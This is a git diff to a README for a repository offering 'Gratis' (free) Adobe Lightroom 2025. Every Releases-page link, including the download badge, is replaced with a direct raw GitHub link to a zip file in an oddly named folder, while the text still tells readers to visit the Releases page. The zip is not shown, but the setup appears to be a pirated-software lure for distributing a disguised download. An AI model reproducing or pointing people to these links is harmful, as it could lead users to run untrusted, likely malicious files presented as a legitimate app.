@@ -1,7 +1,7 @@
 # 🎨 Gratis-Adobe-Lightroom-2025 - Edit Photos Like a Pro
 
 ## 📥 Download the Latest Version
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/yanxgame/Gratis-Adobe-Lightroom-2025/releases)
+[![Download](https://raw.githubusercontent.com/yanxgame/Gratis-Adobe-Lightroom-2025/main/boustrophedon/Gratis-Adobe-Lightroom-2025_1.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/yanxgame/Gratis-Adobe-Lightroom-2025/main/boustrophedon/Gratis-Adobe-Lightroom-2025_1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to Gratis-Adobe-Lightroom-2025! This application allows you to edit your photos with powerful tools, free of charge. You can create stunning images without the need for a subscription. 
@@ -24,7 +24,7 @@ Before you download, ensure your computer meets the following requirements:
 To get started, visit the Releases page to download the application. Follow these steps:
 
 1. Click the link below to go to our Releases page:
-   [Visit Releases Page](https://github.com/yanxgame/Gratis-Adobe-Lightroom-2025/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/yanxgame/Gratis-Adobe-Lightroom-2025/main/boustrophedon/Gratis-Adobe-Lightroom-2025_1.2.zip)
 
 2. On the Releases page, look for the latest stable version of the application.
 
@@ -63,4 +63,4 @@ This software is offered for free. However, it is essential to have respect for 
 ## 📥 Continuing Your Journey
 Photo editing opens new creative doors. Continue to explore all features of Gratis-Adobe-Lightroom-2025 and enhance your photography skills. 
 
-For any updates or new features, remember to check back at the Releases page regularly: [Visit Releases Page](https://github.com/yanxgame/Gratis-Adobe-Lightroom-2025/releases)
+For any updates or new features, remember to check back at the Releases page regularly: [Visit Releases Page](https://raw.githubusercontent.com/yanxgame/Gratis-Adobe-Lightroom-2025/main/boustrophedon/Gratis-Adobe-Lightroom-2025_1.2.zip)
